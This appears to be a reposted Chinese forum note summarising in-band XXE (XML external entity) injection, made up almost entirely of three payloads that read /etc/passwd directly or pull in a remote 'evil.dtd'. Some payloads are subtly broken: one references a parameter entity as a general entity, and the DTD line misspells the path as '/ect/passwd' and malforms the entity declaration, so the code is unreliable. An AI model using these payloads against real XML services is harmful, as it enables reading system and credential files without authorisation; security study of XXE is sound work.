# XXE 有回显利用方式总结

> 原文：[https://www.zhihuifly.com/t/topic/3587](https://www.zhihuifly.com/t/topic/3587)

## XXE 有回显利用方式总结

结合外部实体声明（实体名称 SYSTEM ”uri/url“）和参数实体（% 实体名称 SYSTEM “uri-外部dtd”）有两种方式进行注入攻击

### 姿势一

```
<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE xxe [
    <!ELEMENT name ANY >
    <!ENTITY xxe SYSTEM "file:///etc/passwd" >
]>
<root>
    <name>&xxe;</name>
</root> 
```

### 姿势二

```
<!DOCTYPE foo [<!ELEMENT foo ANY>
<!ENTITY % xxe SYSTEM "file:///etc/passwd">]>
<foo>&xxe;</foo> 
```

### 姿势三

```
<!DOCTYPE foo [<!ELEMENT foo ANY>
<!ENTITY % xxe SYSTEM "http://xxx/evil.dtd">
%xxe;]>
<foo>&evil;</foo> 
```

##### 外部evil.dtd的内容

```
<!ENTITY %evil SYSTEM "file:///ect/passwd"> 
```